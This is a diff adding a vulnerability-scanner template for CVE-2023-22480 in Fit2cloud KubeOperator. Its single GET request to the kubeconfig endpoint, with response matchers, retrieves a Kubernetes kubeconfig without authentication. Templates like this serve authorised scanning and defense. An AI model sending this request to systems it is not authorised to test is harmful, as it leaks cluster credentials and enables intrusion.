@@ -1,0 +1,24 @@
+id: poc-yaml-fit2cloud-kubeoperator-sensitive-information-leak
+info:
+  name: Fit2cloud Kubeoperator Sensitive Information Leak (CVE-2023-22480)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-22480,information-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/clusters/kubeconfig/k8s"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "apiVersion"
+          - "clusters"
+      - type: word
+        part: header
+        words:
+          - "application/download"
